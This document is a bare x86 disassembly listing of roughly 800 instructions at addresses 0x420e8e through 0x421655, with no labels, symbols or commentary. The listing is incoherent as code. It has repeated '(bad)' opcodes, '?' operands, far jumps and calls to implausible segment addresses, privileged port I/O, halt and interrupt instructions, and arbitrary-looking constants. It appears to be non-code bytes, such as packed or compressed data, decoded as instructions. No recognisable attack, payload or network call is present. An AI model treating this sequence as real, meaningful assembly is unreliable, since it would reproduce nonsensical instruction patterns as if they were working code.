  420e8e:	inc    ebx
  420e8f:	pop    es
  420e90:	pusha  
  420e91:	fidiv  DWORD PTR [ebp-0x703573ad]
  420e97:	adc    eax,0x47c4e39e
  420e9c:	cmp    al,0x9
  420e9e:	cmp    ebp,DWORD PTR [ecx+eax*2]
  420ea1:	fimul  DWORD PTR [edx+0x60]
  420ea4:	jle    0x420ef2
  420ea6:	push   eax
  420ea7:	jmp    0x9367:0xa4bad4eb
  420eae:	sub    bl,bl
  420eb0:	retf   
  420eb1:	inc    esp
  420eb2:	and    al,0x47
  420eb4:	lods   al,BYTE PTR ds:[esi]
  420eb5:	dec    ecx
  420eb6:	rcl    BYTE PTR [ebp+0x5a750e59],cl
  420ebc:	cmp    edx,DWORD PTR [ebx-0x3b]
  420ebf:	mov    al,0x4
  420ec1:	mov    eax,0x86bb0759
  420ec6:	xor    edi,DWORD PTR [edx+0x13c26c6c]
  420ecc:	fiadd  WORD PTR [ecx+0x46]
  420ecf:	or     dl,BYTE PTR [edi+edx*1]
  420ed2:	jge    0x420ef7
  420ed4:	mov    esp,0x1ced9bdb
  420ed9:	daa    
  420eda:	mov    ch,0xfe
  420edc:	and    BYTE PTR [eax+0x22bcd03],bl
  420ee2:	popf   
  420ee3:	jmp    0xc07:0x540fd142
  420eea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420eeb:	add    eax,0x2cf04158
  420ef0:	mov    al,BYTE PTR [edx]
  420ef2:	jbe    0x420ed4
  420ef4:	lods   al,BYTE PTR ds:[esi]
  420ef5:	in     al,0x6d
  420ef7:	shr    ebx,1
  420ef9:	ror    BYTE PTR [ebx],1
  420efb:	in     al,0x43
  420efd:	ja     0x420ec7
  420eff:	in     eax,0x43
  420f01:	loope  0x420ed2
  420f03:	inc    esi
  420f04:	push   esi
  420f05:	cwde   
  420f06:	stos   DWORD PTR es:[edi],eax
  420f07:	test   BYTE PTR [ebp-0x45],bl
  420f0a:	or     DWORD PTR [ecx+0x7e],ebx
  420f0d:	pop    ds
  420f0e:	jae    0x420ed9
  420f10:	fisubr WORD PTR [edi+0x18cf6523]
  420f16:	jmp    0x420f3d
  420f18:	fwait
  420f19:	leave  
  420f1a:	mov    esp,0x197fc429
  420f1f:	stc    
  420f20:	adc    BYTE PTR [ecx+0x8],ch
  420f23:	in     eax,0xcb
  420f25:	cwde   
  420f26:	js     0x420ec1
  420f28:	pop    DWORD PTR [ebp-0x18]
  420f2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f2c:	dec    eax
  420f2d:	jae    0x420f56
  420f2f:	shl    DWORD PTR [edi+0x72cbc48d],0xd9
  420f36:	mov    BYTE PTR [esi-0x65],ch
  420f39:	call   0xee8395c1
  420f3e:	imul   ebx,DWORD PTR [ebx+0x30697378],0x63
  420f45:	outs   dx,DWORD PTR ds:[esi]
  420f46:	sbb    ch,dl
  420f48:	inc    edi
  420f49:	leave  
  420f4a:	sbb    BYTE PTR [eax],bl
  420f4c:	mov    esi,0xb643c7d9
  420f51:	dec    ebx
  420f52:	or     eax,0x52978fe
  420f57:	jae    0x420f4f
  420f59:	mov    DWORD PTR [ebp-0x2a],edi
  420f5c:	out    dx,eax
  420f5d:	ss cmp eax,edx
  420f60:	lds    esp,FWORD PTR [ebp-0x3ddfad18]
  420f66:	pop    es
  420f67:	dec    edx
  420f68:	icebp  
  420f69:	inc    esi
  420f6a:	push   esi
  420f6b:	shl    DWORD PTR [ebp-0x275c6ccd],cl
  420f71:	mov    WORD PTR [esi-0x38a7189b],ss
  420f77:	fs jo  0x420f64
  420f7a:	fsubr  DWORD PTR [ebx+0x25]
  420f7d:	dec    edi
  420f7e:	ss push 0x7885fd4c
  420f84:	aam    0xa5
  420f86:	sbb    eax,0x95af2920
  420f8b:	iret   
  420f8c:	mov    ds:0xd6005dd2,eax
  420f91:	or     bh,BYTE PTR [eax-0x3bd9fd4c]
  420f97:	aad    0x41
  420f99:	not    DWORD PTR [eax+0x30]
  420f9c:	pop    esi
  420f9d:	faddp  st(1),st
  420f9f:	push   ss
  420fa0:	mov    al,ds:0xecc3a20c
  420fa5:	fcomip st,st(7)
  420fa7:	shl    BYTE PTR [ebp+eax*4-0x5b594c36],1
  420fae:	mov    bl,BYTE PTR [ecx+eax*2-0x76291d73]
  420fb5:	sub    DWORD PTR [ebx-0x576b7bbf],edx
  420fbb:	and    BYTE PTR [edi],al
  420fbd:	aad    0xf3
  420fbf:	scas   eax,DWORD PTR es:[edi]
  420fc0:	loop   0x420f9e
  420fc2:	cmp    eax,0x6d4da792
  420fc7:	mov    DWORD PTR [eax+0x2c],ecx
  420fca:	stos   BYTE PTR es:[edi],al
  420fcb:	and    dh,BYTE PTR [ebp-0x1b]
  420fce:	and    bh,bh
  420fd0:	fld    DWORD PTR [eax]
  420fd2:	loop   0x420f54
  420fd4:	jno    0x420f97
  420fd6:	(bad)  
  420fd7:	mov    ah,0x10
  420fd9:	cld    
  420fda:	outs   dx,DWORD PTR ds:[esi]
  420fdb:	mov    ebp,0xac0eacfe
  420fe0:	pop    ds
  420fe1:	enter  0x847f,0xbd
  420fe5:	xor    esp,DWORD PTR [edx+0x28da3204]
  420feb:	aaa    
  420fec:	inc    eax
  420fed:	cli    
  420fee:	mov    WORD PTR [esi],?
  420ff0:	and    bh,BYTE PTR ds:0x5a79c175
  420ff6:	cld    
  420ff7:	sbb    ebx,eax
  420ff9:	cli    
  420ffa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ffb:	xlat   BYTE PTR ds:[ebx]
  420ffc:	or     ecx,DWORD PTR [ecx-0x6e884a59]
  421002:	and    ebp,ebp
  421004:	jns    0x420ff1
  421006:	xor    DWORD PTR [edx],eax
  421008:	jno    0x42101c
  42100a:	arpl   si,si
  42100c:	fsubrp st(6),st
  42100e:	jle    0x42104e
  421010:	sar    DWORD PTR [esi-0x4d],0xc8
  421014:	shr    DWORD PTR [esi+eiz*1+0x12000906],1
  42101b:	cmp    eax,0x389aac4b
  421020:	mov    ebx,0x558eb9a4
  421025:	adc    eax,0x3a55d24e
  42102a:	xor    BYTE PTR [esi+0x1e],ah
  42102d:	out    dx,al
  42102e:	add    BYTE PTR [ebx-0x8],al
  421031:	gs sbb edi,edi
  421034:	popf   
  421035:	jg     0x421031
  421037:	enter  0x5972,0xa2
  42103b:	rcr    dh,0x17
  42103e:	lods   al,BYTE PTR ds:[esi]
  42103f:	pop    edx
  421040:	mov    WORD PTR [ecx],es
  421042:	add    bh,ah
  421044:	add    DWORD PTR [eax],eax
  421046:	add    BYTE PTR [eax+0x626d0c94],ch
  42104c:	mov    edi,DWORD PTR [ebx]
  42104e:	neg    esp
  421050:	fs ins BYTE PTR es:[edi],dx
  421052:	outs   dx,BYTE PTR ds:[esi]
  421053:	mov    al,0x8c
  421055:	mov    eax,ds:0x1219a507
  42105a:	push   es
  42105b:	(bad)  
  42105c:	std    
  42105d:	push   eax
  42105e:	popa   
  42105f:	daa    
  421060:	popf   
  421061:	pop    esi
  421062:	xor    ebx,esp
  421064:	add    BYTE PTR [edi+0x3f],0x3e
  421068:	add    dh,0x9e
  42106b:	add    DWORD PTR [eax-0x41fd3e34],esi
  421071:	mov    DWORD PTR ds:0x4df8014,ebp
  421077:	push   eax
  421078:	or     DWORD PTR cs:[edi-0x6c5d2069],esi
  42107f:	jbe    0x421063
  421081:	call   0xa354a95d
  421086:	sub    edi,edx
  421088:	popf   
  421089:	mov    ch,0x8a
  42108b:	and    eax,0xfba45bcb
  421090:	imul   ebx,DWORD PTR [ebx-0x6c],0xa38ac417
  421097:	cmp    DWORD PTR [eax-0x19],ecx
  42109a:	mov    eax,ds:0xd7dcf716
  42109f:	and    DWORD PTR [esi],edi
  4210a1:	mov    ecx,ecx
  4210a3:	in     al,dx
  4210a4:	sub    BYTE PTR [eax-0x2754eaa9],cl
  4210aa:	loopne 0x42111e
  4210ac:	jl     0x421122
  4210ae:	div    ebx
  4210b0:	nop
  4210b1:	push   edi
  4210b2:	push   0x48
  4210b4:	call   0xae12:0x53d34740
  4210bb:	or     bl,ch
  4210bd:	cld    
  4210be:	cmp    DWORD PTR ds:0xd52ea15f,0x14634199
  4210c8:	in     eax,dx
  4210c9:	inc    ecx
  4210ca:	stc    
  4210cb:	sub    BYTE PTR [edx-0x7d],0x95
  4210cf:	jp     0x421149
  4210d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210d2:	jo     0x4210a9
  4210d4:	pop    ss
  4210d5:	test   edx,edi
  4210d7:	xlat   BYTE PTR ds:[ebx]
  4210d8:	cmp    al,0x2b
  4210da:	pop    es
  4210db:	call   0xf2f6a836
  4210e0:	out    dx,al
  4210e1:	cmc    
  4210e2:	fstp   DWORD PTR [ebx+0x75]
  4210e5:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210e7:	inc    ebp
  4210e8:	ja     0x4210dd
  4210ea:	shl    BYTE PTR [ebx],0x51
  4210ed:	stos   DWORD PTR es:[edi],eax
  4210ee:	and    al,0x3d
  4210f0:	arpl   WORD PTR [edx+ecx*2+0x48],si
  4210f4:	sbb    BYTE PTR [eax+0x63cf85c],bh
  4210fa:	cmp    eax,0xdf7f2793
  4210ff:	cmc    
  421100:	cs inc esi
  421102:	cli    
  421103:	stc    
  421104:	daa    
  421105:	in     eax,0x3c
  421107:	mov    edx,0x88192c47
  42110c:	scas   al,BYTE PTR es:[edi]
  42110d:	ins    BYTE PTR es:[edi],dx
  42110e:	retf   0x6311
  421111:	dec    ebp
  421112:	inc    edi
  421113:	lock call 0x951f:0xae83834a
  42111b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42111c:	add    al,0x10
  42111e:	test   BYTE PTR [ecx-0x6cb12a8b],dl
  421124:	data16 test BYTE PTR [edx+eiz*8-0x28],ch
  421129:	pop    edx
  42112a:	lods   eax,DWORD PTR ds:[esi]
  42112b:	popa   
  42112c:	xchg   DWORD PTR [edi],eax
  42112e:	sbb    edx,DWORD PTR [ebx+0x33a8efe6]
  421134:	mov    WORD PTR [eax-0x19],cs
  421137:	in     eax,0x92
  421139:	mov    dh,0xdc
  42113b:	mov    bh,BYTE PTR [ecx-0x6f7c4ac2]
  421141:	sbb    BYTE PTR [eax],dh
  421143:	mov    fs:0xe9b370b9,eax
  421149:	cmp    BYTE PTR [ebx],ah
  42114b:	xchg   ebx,eax
  42114c:	popa   
  42114d:	jge    0x4210e8
  42114f:	mov    esp,0x9522f975
  421154:	aas    
  421155:	cmc    
  421156:	mov    bh,0xad
  421158:	ins    DWORD PTR es:[edi],dx
  421159:	sub    BYTE PTR [esi-0x55],dl
  42115c:	jmp    0x96a449b9
  421161:	push   eax
  421162:	push   esp
  421163:	inc    eax
  421164:	or     eax,0xca4905bd
  421169:	mov    ah,0xe5
  42116b:	jl     0x42119b
  42116d:	jge    0x421122
  42116f:	cmp    BYTE PTR [esi+ecx*2+0x0],bh
  421173:	fsub   QWORD PTR [ebx]
  421175:	cmp    cl,BYTE PTR ds:0xbcbac334
  42117b:	push   ss
  42117c:	push   edi
  42117d:	inc    esi
  42117e:	(bad)  
  42117f:	call   0x200e:0x229dd72e
  421186:	call   0x43b4:0x2cae9068
  42118d:	rol    BYTE PTR [edi+0x25],cl
  421190:	cs pop ss
  421192:	adc    al,0xfd
  421194:	cwde   
  421195:	out    0x69,eax
  421197:	out    0xb4,al
  421199:	out    dx,al
  42119a:	mov    ds:0x8d0c84fd,al
  42119f:	pop    ebp
  4211a0:	xor    ebp,ebp
  4211a2:	adc    ecx,DWORD PTR [edx+0x6c]
  4211a5:	sbb    DWORD PTR [edx],ebp
  4211a7:	adc    eax,esi
  4211a9:	or     ebp,DWORD PTR [ebp-0x22]
  4211ac:	inc    ebx
  4211ad:	mov    eax,DWORD PTR [edx+0xc]
  4211b0:	push   edi
  4211b1:	(bad)  [esi]
  4211b3:	jle    0x42117a
  4211b5:	inc    ebx
  4211b6:	lahf   
  4211b7:	mov    eax,ds:0x86702da7
  4211bc:	lahf   
  4211bd:	and    esi,esp
  4211bf:	pop    esp
  4211c0:	adc    cl,BYTE PTR [edi-0x353f8914]
  4211c6:	ds inc eax
  4211c8:	jne    0x421214
  4211ca:	push   edi
  4211cb:	mov    eax,ds:0xb960cab5
  4211d0:	mov    edx,0xf7af71c7
  4211d5:	inc    eax
  4211d6:	xchg   edi,eax
  4211d7:	mov    ebx,0x64d1ae2f
  4211dc:	fmulp  st(6),st
  4211de:	leave  
  4211df:	jmp    0x8fd6:0x6706263d
  4211e6:	mov    dh,0x6a
  4211e8:	pop    esp
  4211e9:	push   eax
  4211ea:	fcomp  st(3)
  4211ec:	sub    eax,0x2f633348
  4211f1:	pop    ecx
  4211f2:	or     edi,DWORD PTR [eax]
  4211f4:	jnp    0x4211c6
  4211f6:	push   0x58
  4211f8:	test   DWORD PTR [ecx],0x1643ebef
  4211fe:	ins    BYTE PTR es:[edi],dx
  4211ff:	or     bl,dl
  421201:	add    esi,ebp
  421203:	sbb    DWORD PTR [edx-0x4ce450a6],edi
  421209:	bound  edi,QWORD PTR [esi-0x5f]
  42120c:	ins    DWORD PTR es:[edi],dx
  42120d:	mov    ds:0xc920d751,al
  421212:	push   eax
  421213:	pop    esp
  421214:	ins    DWORD PTR es:[edi],dx
  421215:	lahf   
  421216:	in     al,0xea
  421218:	into   
  421219:	mov    bl,0x59
  42121b:	in     eax,dx
  42121c:	mov    DWORD PTR [ecx-0x33eeb5ea],ebx
  421222:	aaa    
  421223:	dec    eax
  421224:	push   eax
  421225:	imul   DWORD PTR ds:0x52cb63fd
  42122b:	push   0xffffffab
  42122d:	or     eax,0x9e820700
  421232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421233:	lahf   
  421234:	mov    edi,0x59e1a23f
  421239:	add    ch,BYTE PTR ss:[ecx]
  42123c:	lea    ebx,[esi+0x63]
  42123f:	inc    ecx
  421240:	mov    es,WORD PTR [ecx]
  421242:	add    bh,ah
  421244:	add    DWORD PTR [eax],eax
  421246:	add    BYTE PTR [ebx+0x30d95d69],cl
  42124c:	cmp    dl,BYTE PTR [edx]
  42124e:	adc    eax,0xdf811b0d
  421253:	test   al,0xf5
  421255:	push   esp
  421256:	sahf   
  421257:	call   0xeb86:0x598954e9
  42125e:	push   cs
  42125f:	hlt    
  421260:	mov    ?,WORD PTR [edx-0x7f4371e4]
  421266:	sbb    DWORD PTR [ebp-0x1472160a],ebx
  42126c:	mov    ds:0xedd2f361,eax
  421271:	sbb    al,0xc7
  421273:	mov    al,0x71
  421275:	inc    esi
  421276:	retf   0xd4b3
  421279:	mov    esp,0x3f90b676
  42127e:	pop    ebx
  42127f:	dec    ebx
  421280:	dec    esi
  421281:	dec    edx
  421282:	mov    dl,0x75
  421284:	fisub  DWORD PTR ds:0xe74196dd
  42128a:	push   ebx
  42128b:	(bad)  
  42128c:	jnp    0x4212ac
  42128e:	fmul   QWORD PTR [ebx]
  421290:	and    esi,DWORD PTR [esi]
  421292:	outs   dx,DWORD PTR ds:[esi]
  421293:	jmp    DWORD PTR [ebp+0x3e]
  421296:	or     bl,BYTE PTR [edx-0x1cd129f7]
  42129c:	pushf  
  42129d:	dec    ebx
  42129e:	iret   
  42129f:	pop    ds
  4212a0:	retf   
  4212a1:	jg     0x490c06e0
  4212a7:	inc    esp
  4212a8:	add    DWORD PTR [ecx+0x2a57e987],edx
  4212ae:	adc    al,0x9f
  4212b0:	jbe    0x421253
  4212b2:	retf   
  4212b3:	mov    fs,WORD PTR [ebp-0x38]
  4212b6:	out    0xed,al
  4212b8:	cwde   
  4212b9:	push   ds
  4212ba:	(bad)  
  4212bb:	sbb    al,0x96
  4212bd:	enter  0xbba8,0x5c
  4212c1:	loope  0x421245
  4212c3:	sahf   
  4212c4:	and    ecx,edi
  4212c6:	pop    eax
  4212c7:	in     al,dx
  4212c8:	jo     0x42132a
  4212ca:	add    DWORD PTR [edi-0x54],esp
  4212cd:	jmp    0x1555:0x2e92ff8a
  4212d4:	cmp    DWORD PTR [ebx],ebp
  4212d6:	jne    0x421304
  4212d8:	ret    
  4212d9:	rcl    BYTE PTR [ecx+ebp*4+0x36],0x7f
  4212de:	jae    0x4212d5
  4212e0:	xor    ah,BYTE PTR [ebx]
  4212e2:	and    eax,0xcfc1eda6
  4212e7:	xchg   esi,eax
  4212e8:	call   0x36d65c8f
  4212ed:	loope  0x42131a
  4212ef:	xchg   ecx,eax
  4212f0:	sahf   
  4212f1:	in     al,0x29
  4212f3:	sub    al,0xf1
  4212f5:	(bad)  
  4212f6:	outs   dx,DWORD PTR ds:[esi]
  4212f7:	sbb    eax,0x2318da32
  4212fc:	jle    0x421334
  4212fe:	test   DWORD PTR [ebp+edi*2-0x6d],ebp
  421302:	xor    BYTE PTR [ebx+0x5805819],dl
  421308:	mov    cl,0x55
  42130a:	jbe    0x42130b
  42130c:	dec    edi
  42130d:	repz in al,0xbf
  421310:	iret   
  421311:	and    esi,eax
  421313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421314:	xor    eax,0x19b37917
  421319:	xchg   ebp,eax
  42131a:	push   ecx
  42131b:	cmp    BYTE PTR [ebx-0x42e4e679],dh
  421321:	inc    ecx
  421322:	pushf  
  421323:	mov    esi,0x832fbaba
  421328:	test   al,0xd4
  42132a:	push   edi
  42132b:	scas   eax,DWORD PTR es:[edi]
  42132c:	leave  
  42132d:	in     eax,dx
  42132e:	adc    DWORD PTR [eax+0x38],0xffffffc2
  421332:	je     0x4212dc
  421334:	cmp    DWORD PTR [ecx+0x16d88aa],ebp
  42133a:	add    DWORD PTR [ecx],ebx
  42133c:	cwde   
  42133d:	push   esi
  42133e:	pop    es
  42133f:	add    ah,BYTE PTR [ebp-0x40]
  421342:	fistp  WORD PTR [edi-0x76]
  421345:	sahf   
  421346:	sbb    eax,0x53395a8
  42134b:	stos   DWORD PTR es:[edi],eax
  42134c:	sti    
  42134d:	out    dx,eax
  42134e:	out    0x99,eax
  421350:	or     eax,0x4f26fa1f
  421355:	jno    0x4212d8
  421357:	push   ecx
  421358:	out    0xde,al
  42135a:	iret   
  42135b:	cmp    eax,0xe41a10f2
  421360:	jbe    0x421392
  421362:	fs mov al,gs:0x8e4153e0
  421369:	inc    ebx
  42136a:	and    dl,BYTE PTR [esi-0x73f195e4]
  421370:	pop    esp
  421371:	jns    0x421391
  421373:	or     DWORD PTR [ecx],edi
  421375:	sbb    al,0x3a
  421377:	pushf  
  421378:	out    0x2f,al
  42137a:	inc    edi
  42137b:	inc    ebp
  42137c:	loope  0x421339
  42137e:	(bad)  
  421380:	adc    BYTE PTR [eax+eiz*8],ch
  421383:	inc    edi
  421384:	xchg   ecx,eax
  421385:	sub    cl,ch
  421387:	sub    eax,0x996a55fa
  42138c:	dec    ebx
  42138d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42138e:	pop    eax
  42138f:	rol    BYTE PTR [ebx-0x19193617],0x77
  421396:	mov    al,ds:0x6f07c795
  42139b:	push   bp
  42139d:	mov    ebx,0x23ea2e14
  4213a2:	pop    ds
  4213a3:	stos   DWORD PTR es:[edi],eax
  4213a4:	popa   
  4213a5:	aaa    
  4213a6:	(bad)  
  4213a7:	test   BYTE PTR [edi-0x13],0x46
  4213ab:	mov    al,0x8c
  4213ad:	popf   
  4213ae:	and    edi,ebp
  4213b0:	test   eax,0x335a20db
  4213b5:	imul   eax,DWORD PTR [edi],0xb43069ca
  4213bb:	xchg   BYTE PTR [edx+0x3deeae72],bh
  4213c1:	in     al,0x82
  4213c3:	add    DWORD PTR [ecx],0xffffffc2
  4213c6:	arpl   WORD PTR [edx-0x74eea5c5],di
  4213cc:	fsub   QWORD PTR ds:0x9d6b6c64
  4213d2:	xor    edi,0x3c
  4213d5:	add    al,0x5d
  4213d7:	lea    edi,[ecx-0x27bc272]
  4213dd:	push   0xbfe77017
  4213e2:	pop    ss
  4213e3:	jecxz  0x42144b
  4213e5:	popa   
  4213e6:	loopne 0x421458
  4213e8:	cmp    eax,0xa8568f72
  4213ed:	xchg   DWORD PTR [ebx],edi
  4213ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213f0:	retf   
  4213f1:	lea    ebx,[esi-0x63]
  4213f4:	mov    al,0x22
  4213f6:	icebp  
  4213f7:	call   FWORD PTR [ebp-0x3d]
  4213fa:	push   ebx
  4213fb:	das    
  4213fc:	in     eax,dx
  4213fd:	fist   WORD PTR [esi]
  4213ff:	push   0x26
  421401:	in     al,dx
  421402:	ins    DWORD PTR es:[edi],dx
  421403:	js     0x4213c6
  421405:	addr16 sub al,cl
  421408:	and    eax,0xccad231d
  42140d:	inc    edx
  42140e:	cli    
  42140f:	not    BYTE PTR [edi-0x19e1ea4b]
  421415:	ins    BYTE PTR es:[edi],dx
  421416:	dec    ebx
  421417:	dec    edx
  421418:	cmp    edx,DWORD PTR [ebx]
  42141a:	add    BYTE PTR [eax-0x58],al
  42141d:	mov    ecx,0x6d951364
  421422:	add    al,0xc8
  421424:	call   0x4dbff571
  421429:	sar    ecx,0x5a
  42142c:	aas    
  42142d:	inc    DWORD PTR [eax]
  42142f:	jecxz  0x421419
  421431:	nop
  421432:	rcr    BYTE PTR [ebx+0x1bfbe3f8],1
  421438:	and    ecx,0x3d6419f
  42143e:	in     eax,dx
  42143f:	sub    BYTE PTR [eax+0x1e70001],dl
  421445:	add    BYTE PTR [eax],al
  421447:	or     esp,eax
  421449:	out    0x14,al
  42144b:	xor    al,0x8
  42144d:	cmp    BYTE PTR [ebx+edi*8],bh
  421450:	in     eax,0xdb
  421452:	imul   edx,ecx,0x159368a2
  421458:	pop    esi
  421459:	cmp    BYTE PTR [edx+ecx*8],ah
  42145c:	mov    al,0xb1
  42145e:	sbb    ah,ah
  421460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421461:	inc    edx
  421462:	ret    
  421463:	push   ecx
  421464:	shl    edx,1
  421466:	in     al,0x6d
  421468:	clc    
  421469:	jl     0x42141e
  42146b:	data16 test BYTE PTR [ecx-0x6af9f465],al
  421472:	ja     0x4214bd
  421474:	int    0x70
  421476:	pop    esi
  421477:	pop    ecx
  421478:	sbb    al,0x39
  42147a:	sti    
  42147b:	adc    al,0x95
  42147d:	and    esi,DWORD PTR [ecx-0x2]
  421480:	xchg   BYTE PTR [edi-0x2],al
  421483:	mov    ebp,DWORD PTR [ecx]
  421485:	mov    al,ds:0x6595744e
  42148a:	sar    DWORD PTR [ecx+0x72ffc3b9],1
  421490:	dec    ecx
  421491:	repz push ss
  421493:	xor    DWORD PTR [edx-0x64],ebx
  421496:	sti    
  421497:	data16 shl BYTE PTR [esp+eax*8-0x378b439d],0xea
  4214a0:	sub    BYTE PTR [eax+0x15],ch
  4214a3:	mov    edx,DWORD PTR [ebx-0x26]
  4214a6:	dec    sp
  4214a8:	mov    ecx,0x2dc6d32d
  4214ad:	mov    al,0xd0
  4214af:	nop    DWORD PTR cs:[edx+ecx*1+0x55]
  4214b5:	outs   dx,BYTE PTR ds:[esi]
  4214b6:	mov    BYTE PTR [eax-0x6021dfc0],al
  4214bc:	or     al,0xc9
  4214be:	cmp    DWORD PTR [eax],0xffffffc1
  4214c1:	jecxz  0x421450
  4214c3:	mov    ecx,0x48589b19
  4214c8:	imul   ebp,ecx,0x3c
  4214cb:	ins    BYTE PTR es:[edi],dx
  4214cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214cd:	mov    edx,0xbfcf8ed4
  4214d2:	(bad)  
  4214d3:	stos   DWORD PTR es:[edi],eax
  4214d4:	mov    bh,BYTE PTR [ebx-0x8]
  4214d7:	inc    ecx
  4214d8:	scas   al,BYTE PTR es:[edi]
  4214d9:	(bad)  
  4214da:	test   eax,0x90e90a5f
  4214df:	sub    bh,BYTE PTR [ebx-0x500f13bd]
  4214e5:	sub    al,BYTE PTR [ebp+eax*1-0x25a6c7e6]
  4214ec:	dec    eax
  4214ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214ee:	or     BYTE PTR [edx-0x7ff65425],bl
  4214f4:	(bad)  
  4214f5:	dec    ebp
  4214f6:	dec    esi
  4214f7:	add    al,0x3f
  4214f9:	cmp    eax,0x54abaea2
  4214fe:	adc    al,BYTE PTR [ebx]
  421500:	test   al,0xa1
  421502:	inc    edx
  421503:	cwde   
  421504:	mov    ah,0x14
  421506:	sbb    ebp,edx
  421508:	stc    
  421509:	jno    0x421526
  42150b:	std    
  42150c:	pop    esp
  42150d:	or     eax,DWORD PTR ds:0xc3e40364
  421513:	mov    edi,0x38c33226
  421518:	aam    0x52
  42151a:	and    BYTE PTR [edx-0x7df5453c],0xf7
  421521:	shr    esp,cl
  421523:	sub    ebp,DWORD PTR [edi]
  421525:	inc    eax
  421526:	retf   
  421527:	add    al,0x63
  421529:	and    DWORD PTR [ebx+0x3502064c],esp
  42152f:	push   eax
  421530:	scas   eax,DWORD PTR es:[edi]
  421531:	outs   dx,BYTE PTR ds:[esi]
  421532:	loope  0x4214ef
  421534:	sub    al,BYTE PTR [ecx+0x839e1b9]
  42153a:	mov    bl,ch
  42153c:	add    ebx,edi
  42153e:	xchg   esp,eax
  42153f:	lea    ebx,[edi+0x2]
  421542:	adc    BYTE PTR [esi],bh
  421544:	dec    edx
  421545:	ret    
  421546:	mov    esi,0xd5515101
  42154b:	dec    edi
  42154c:	sub    DWORD PTR [esp+ecx*1],0xffffffc8
  421550:	inc    edi
  421551:	xor    cl,BYTE PTR [esi]
  421553:	sub    DWORD PTR [ebx],esp
  421555:	xchg   DWORD PTR [esi-0x34],edi
  421558:	fbstp  TBYTE PTR [esi]
  42155a:	jns    0x4215cc
  42155c:	cwde   
  42155d:	adc    al,0xc6
  42155f:	add    BYTE PTR [ebx-0x6a537f09],bl
  421565:	retf   
  421566:	hlt    
  421567:	adc    DWORD PTR [edx-0x5a323d82],eax
  42156d:	out    0xee,al
  42156f:	addr16 daa 
  421571:	ret    
  421572:	xchg   ebp,eax
  421573:	or     DWORD PTR [eax-0x71],eax
  421576:	push   esp
  421577:	test   ch,ah
  421579:	bound  esi,QWORD PTR [ebx+0x67]
  42157c:	xchg   ecx,eax
  42157d:	ds test eax,0xbbd5fe41
  421583:	sub    al,0xf
  421585:	mov    al,0x14
  421587:	xchg   ebp,eax
  421588:	adc    dh,BYTE PTR [edi-0x80]
  42158b:	pop    ds
  42158c:	inc    ebx
  42158d:	lods   eax,DWORD PTR ds:[esi]
  42158e:	ret    
  42158f:	cld    
  421590:	rol    BYTE PTR [eax],0x43
  421593:	ins    DWORD PTR es:[edi],dx
  421594:	ror    BYTE PTR [bp+si-0x67],1
  421598:	arpl   si,bx
  42159a:	lahf   
  42159b:	mov    dh,0xcc
  42159d:	xchg   esi,eax
  42159e:	lock cld 
  4215a0:	mov    ch,0x89
  4215a2:	mov    edi,0xa560d334
  4215a7:	mov    ch,0x29
  4215a9:	dec    ecx
  4215aa:	sbb    cl,BYTE PTR [ebx+eiz*2+0x519d29ac]
  4215b1:	xchg   cl,ah
  4215b3:	inc    edx
  4215b4:	dec    esp
  4215b5:	and    eax,0x7b16debd
  4215ba:	cmp    edx,eax
  4215bc:	pop    ebx
  4215bd:	and    ebp,edi
  4215bf:	sbb    dl,BYTE PTR [esi+ebx*4]
  4215c2:	jmp    0x3bbd616c
  4215c7:	in     al,0x9c
  4215c9:	push   ds
  4215ca:	push   ecx
  4215cb:	cmc    
  4215cc:	out    dx,eax
  4215cd:	sub    DWORD PTR [edi+esi*4-0x44],ebp
  4215d1:	inc    ebx
  4215d2:	adc    ebx,ecx
  4215d4:	pop    eax
  4215d5:	xchg   esp,eax
  4215d6:	fwait
  4215d7:	cli    
  4215d8:	push   ds
  4215d9:	jmp    0x42164d
  4215db:	push   cs
  4215dc:	add    dl,BYTE PTR [esi]
  4215de:	xor    eax,0x91655a77
  4215e3:	xlat   BYTE PTR ds:[ebx]
  4215e4:	or     al,0x2a
  4215e6:	inc    ecx
  4215e7:	fwait
  4215e8:	cmc    
  4215e9:	dec    eax
  4215ea:	jne    0x4215a3
  4215ec:	imul   eax,DWORD PTR [esi+0x1],0xffffffbd
  4215f0:	daa    
  4215f1:	dec    ebp
  4215f2:	mov    fs,WORD PTR [edi+0x3acbfbb2]
  4215f8:	lea    ecx,[ebx-0x7d]
  4215fb:	adc    eax,0x11704898
  421600:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421601:	push   0xc35cb754
  421606:	add    BYTE PTR [ebx],0x6d
  421609:	test   al,0xb1
  42160b:	popa   
  42160c:	stos   DWORD PTR es:[edi],eax
  42160d:	mov    al,ds:0xc965b997
  421612:	lods   al,BYTE PTR ds:[esi]
  421613:	stc    
  421614:	jl     0x421643
  421616:	fwait
  421617:	push   ecx
  421618:	(bad)  
  42161c:	xchg   esi,eax
  42161d:	inc    edx
  42161e:	mov    BYTE PTR [esi],dh
  421620:	lea    ebp,[ebx*2-0x46ae17cf]
  421627:	jmp    0x421688
  421629:	inc    edx
  42162a:	iret   
  42162b:	xor    eax,0xee002e88
  421630:	data16 hlt 
  421632:	lods   eax,DWORD PTR ds:[esi]
  421633:	cld    
  421634:	mov    edi,0x9c9c67ff
  421639:	push   edi
  42163a:	jge    0x42162a
  42163c:	xchg   edx,eax
  42163d:	cmc    
  42163e:	mov    WORD PTR [edi],cs
  421640:	xchg   edx,eax
  421641:	add    DWORD PTR [eax],eax
  421643:	out    0x1,eax
  421645:	add    BYTE PTR [eax],al
  421647:	xchg   esp,eax
  421648:	mov    al,ds:0x1569e8f2
  42164d:	xchg   BYTE PTR ds:0x3c1045d1,dl
  421653:	nop
  421654:	sahf   
  421655:	shl    DWORD PTR ds:0xf86922f,0x71
